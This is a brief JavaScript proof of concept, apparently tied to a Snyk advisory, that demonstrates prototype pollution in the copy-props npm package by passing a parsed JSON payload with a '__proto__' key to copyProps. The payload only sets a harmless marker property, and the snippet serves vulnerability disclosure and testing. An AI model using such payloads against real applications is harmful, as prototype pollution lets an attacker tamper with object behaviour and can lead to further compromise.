//https://snyk.io/vuln/SNYK-JS-COPYPROPS-1082870
const copyProps = require("copy-props");
const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
copyProps(JSON.parse(malicious_payload), {});
